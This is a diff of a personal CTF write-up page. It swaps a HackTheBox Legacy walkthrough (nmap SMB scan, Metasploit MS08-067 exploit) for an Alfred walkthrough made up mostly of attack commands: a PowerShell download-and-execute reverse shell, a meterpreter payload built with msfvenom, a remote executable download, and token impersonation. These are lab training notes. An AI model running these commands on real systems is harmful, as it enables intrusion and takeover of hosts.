@@ -42,87 +42,54 @@
         
         <div id="writeup-box-name">
 
-            <p>...Legacy Writeup...</p>
+            <p>...Alfred Walkthrough...</p>
 
         </div>
 
-        <div id="center-writeup-image">
-
-            <img src="legacy/1.png" alt="legacy">
-            
-        </div>
-        
-        
 <div id="marg-asthetic">
-        
-        <h2>1. Enumeration</h2>
-        
-        <p>Legacy was my first HackTheBox …box. It’s a super easy one to get you into the swing of things. This will be a short writeup on what I did to pown it.<br><br>I ran a basic nmap scan (sV = service version(s)):</p>
-        
-        <img src="legacy/2.png" height=210 width=750 alt="legacy">
-        
-       
-     <h2>2. Nmap's NSE (Further enum)</h2>
-     
-     
-        <p>I tried testing smb first, using a guest account to see if it has a password. Next up I honed in on the ports with an nmap script: <div class="code-view"><pre><b>nmap -script smb-vuln -p 139,445 10.10.10.4)</b></pre></div>
-        
-        <p>Running this Nmap scan looking for issues with SMB resulted in a finding for ms08-067:</p>
-        
-        
-        <img src="legacy/3.png" height=500 width=750 alt="legacy">
     
-
-    <h2>3. Getting SYSTEM Access</h2>
-        
+            <img src="images/alfred_banner.png" alt="legacy" width="700">
+            
+    <h2>Commands used</h2>
     
-    <p>I decided to go with the MS08-067 exploit and opened it up in metasploit:</p>
+    <p>Commands used:</p>
         
-    <div class="code-view"><pre><b>Search MS08-067
+    <div class="code-view-two"><pre><b>
 
-    Use 0
+powershell iex (New-Object Net.WebClient).DownloadString(‘hxxp://10.11.3.40:80/Invoke-PowerShellTcp.ps1’);Invoke-PowerShellTcp<br> -Reverse -IPAddress 10.11.3.40 -Port 4444
 
-    Set RHOSTS 10.10.10.4
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 –encoder x86/shikata_ga_nai LHOST=10.11.3.40 LPORT=4445 -f exe -o malicious.exe
 
-    Run</b></pre></div>   
-        
-    <p>So now, I was running as SYSTEM but I couldn’t run various commands e.g whoami.
-So I decided to upload it from my local machine:</p>       
-        
-    <div class="code-view"><pre><b>si@kali:~$ locate whoami.exe
+powershell “(New-Object System.Net.WebClient).Downloadfile(‘hxxp://10.11.3.40:80/malicious.exe’,’malicious.exe’)”
 
-    /usr/share/windows-resources/binaries/whoami.exe</b></pre>    
-    
-    <p>I ran the following command:</p>
-        
-        <pre><b>Upload /usr/share/windows-resources/binaries/whoami.exe</b></pre></div>
-     
-    <p>I could now run the command(s) I wanted. I figured I should do this to feel "complete". Next up, was reading the flag:</p>
-        
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.11.3.40 set LPORT 4445 run
 
-<div class="code-view"><pre><b>Directory of C:\Documents and Settings\Administrator\Desktop
+Start-Process “malicious.exe”
 
-16/03/2017  09:18       DIR          .
+whoami /priv
 
-16/03/2017  09:18       DIR          ..
+use incognito
 
-16/03/2017  09:18                   32 root.txt
+list_tokens -g
 
-1 File(s)             32 bytes
+impersonate_token “BUILTIN\Administrators”
 
-2 Dir(s)   6.484.148.224 bytes free
+ps
 
+migrate to services.msc
 
-C:\Documents and Settings\Administrator\Desktop>more root.txt
+search -f root
 
-more root.txt
+shell
 
-***hash removed***
+type c:\Windows\System32\config\root.txt
 </b>
 </pre></div>
-<!-- b / pre in this order is valid. pre /b not valid html -->
+<br>
+    
+    <iframe width="560" height="315" src="https://www.youtube.com/embed/xMBS0ifSSks" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
 
-<p>And that was that. First box, done!</p>
+<p>Thanks for reading / watching !</p>
     
 
 
